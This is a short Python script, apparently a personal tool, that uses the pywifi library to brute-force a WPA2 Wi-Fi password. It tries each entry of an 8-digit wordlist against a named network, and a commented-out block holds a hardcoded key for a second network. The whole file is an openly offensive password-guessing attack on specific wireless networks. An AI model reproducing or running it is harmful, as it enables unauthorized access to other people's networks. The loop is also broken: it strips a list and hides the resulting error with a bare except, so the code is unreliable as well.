import pywifi
from pywifi import const
import time


def getInterface():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    return interface


def testwifi(interface, wifiname, password):
    profile = pywifi.Profile()
    profile.ssid = wifiname
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    profile = interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(5)
    print(interface.status())
    if interface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


def beginWork(wifiname):
    interfaces = getInterface()
    path = r'password-8位数字.txt'
    files = open(path, 'r')
    while True:
        try:
            password = files.readlines()
            password = password.strip('\n')
            print(password)
            if not password:
                break
            print('正在尝试%s,%s' % (wifiname, password))
            if testwifi(interfaces, wifiname, password):
                break
        except:
            continue
        files.close()


beginWork('CMCC-301')

# profile = pywifi.Profile()
# profile.ssid = 'Xiaomi_A3F5'
# profile.auth = const.AUTH_ALG_OPEN
# profile.akm.append(const.AKM_TYPE_WPA2PSK)
# profile.cipher = const.CIPHER_TYPE_CCMP
# profile.key = '151Hhpon?'

# wifi = pywifi.PyWiFi()
# iface = wifi.interfaces()[0]
# profile = iface.add_network_profile(profile)
# iface.connect(profile)
